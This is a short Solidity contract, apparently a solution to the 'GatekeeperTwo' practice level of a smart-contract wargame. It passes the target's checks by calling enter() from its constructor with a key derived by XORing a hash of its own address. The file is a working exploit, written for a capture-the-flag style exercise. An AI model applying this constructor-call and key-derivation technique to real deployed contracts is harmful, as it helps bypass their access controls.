// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoHack {
  GatekeeperTwo public gatekeeperTwoContract;
  address public owner;
  uint64 public gateKey;
  // Need to do everything in here to pass second check
  constructor(address _gatekeeperAddress) {
    gatekeeperTwoContract = GatekeeperTwo(_gatekeeperAddress);

    gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;

    gatekeeperTwoContract.enter(bytes8(gateKey));

  }

}